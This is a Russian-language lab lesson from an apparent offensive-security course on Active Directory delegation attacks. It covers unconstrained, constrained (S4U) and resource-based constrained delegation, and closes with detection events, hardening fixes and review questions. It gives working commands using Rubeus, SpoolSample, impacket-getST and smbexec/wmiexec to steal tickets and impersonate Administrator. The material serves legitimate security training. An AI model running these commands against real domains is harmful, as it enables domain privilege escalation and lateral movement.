# 11.4 — Delegation

> **M11 · Этап 2 · 4 ч · 🔴 · артефакт:** `labs/m11-ad-attacks/l04-delegation/`

## Цель

Понять три вида делегирования в AD и научиться превращать неверную настройку в доступ к другим сервисам и хостам.

## Результат

- Найдено unconstrained delegation и получен тикет.
- Эксплуатация constrained delegation (S4U2Self/S4U2Proxy).
- Понимание RBCD и его предусловий.

## Теория

### 1. Unconstrained delegation

Компьютер/аккаунт с `TRUSTED_FOR_DELEGATION` получает TGT пользователя при аутентификации и хранит его в LSASS. Если такой хост скомпрометирован — можно забрать чужие TGT (включая DA, если он зашёл).

```powershell
Get-DomainComputer -Unconstrained | select name
Get-DomainUser -Unconstrained | select samaccountname
```

Эксплуатация: `Rubeus.exe monitor /interval:5` на скомпрометированном хосте + принтер-трюк (`SpoolSample`) для принудительной аутентификации DC.

### 2. Constrained delegation

Аккаунт с `msDS-AllowedToDelegateTo` может запрашивать тикеты к указанным SPN. Если есть `TRUSTED_TO_AUTH_FOR_DELEGATION` (protocol transition), можно использовать S4U2Self без пароля пользователя.

```powershell
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

Эксплуатация:

```bash
impacket-getST -spn cifs/dc01.lab.local -impersonate Administrator lab.local/svc_web:'Pass!' -dc-ip 10.10.10.10
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass dc01.lab.local
```

### 3. Resource-Based Constrained Delegation (RBCD)

Контроль над компьютерным объектом (например, `GenericWrite`/`GenericAll`) позволяет записать в `msDS-AllowedToActOnBehalfOfOtherIdentity` свой аккаунт и затем имперсонировать любого пользователя к этому хосту.

```powershell
Set-ADComputer WIN02 -PrincipalsAllowedToDelegateToAccount (Get-ADUser attacker)
```

Нужно право на запись атрибута у целевого компьютера.

### 4. Детект

- 4769 с `Transited Services` и необычным `Service Name`.
- 4624 type 3 на целевых хостах.
- Изменение `msDS-AllowedToActOnBehalfOfOtherIdentity` (5136).
- Аномальные S4U2Self/S4U2Proxy в логах DC.

## Лаборатория

> `DC01`, `WIN01` (unconstrained), `WIN02` (constrained для `svc_web`), `WIN03` (RBCD-цель).

### 1. Инвентаризация

```powershell
Get-DomainComputer -Unconstrained | select name,dnsname
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

Ожидаемо: `WIN01` unconstrained, `svc_web` constrained.

### 2. Unconstrained: сбор TGT

На `WIN01` (после локального админа):

```powershell
Rubeus.exe monitor /interval:5 /nowrap
```

С другого хоста принудительная аутентификация DC:

```powershell
SpoolSample.exe DC01 WIN01
```

Ожидаемо: base64 TGT `DC01$`. Импортируйте и проверьте `klist`.

### 3. Constrained: S4U

```bash
impacket-getST -spn cifs/win02.lab.local -impersonate Administrator lab.local/svc_web:'WebPass123!' -dc-ip 10.10.10.10
export KRB5CCNAME=Administrator@cifs_win02.lab.local@LAB.LOCAL.ccache
impacket-smbexec -k -no-pass win02.lab.local
```

Ожидаемо: shell на `WIN02` от `Administrator`.

### 4. RBCD

```powershell
# с правами на WIN03
Set-ADComputer WIN03 -PrincipalsAllowedToDelegateToAccount (Get-ADUser alice)
```

Затем `getST` с `-impersonate Administrator` к `cifs/win03`. Ожидаемо: доступ.

### 5. Уборка

Удалите записи делегирования, верните снимок. Зафиксируйте, что изменили.

## Атака и защита

- **Атака:** unconstrained → кража TGT; constrained → S4U; RBCD → запись атрибута.
- **Детект:** 4769 с transited services, 5136 на delegation-атрибуты, аномальные S4U.
- **Фикс:** не давать unconstrained привилегированным аккаунтам, `Protected Users`, «Account is sensitive and cannot be delegated», аудит `AllowedToDelegateTo`, ограничение прав на компьютерные объекты, tiered admin.

## Самопроверка

- [ ] Почему unconstrained delegation опасен для DC?
- [ ] Чем S4U2Self отличается от S4U2Proxy?
- [ ] Что нужно для RBCD?
- [ ] Какой атрибут меняется при RBCD?
- [ ] Как «sensitive and cannot be delegated» помогает?

## Дальше

[11.5 — ADCS](l05-adcs.md)
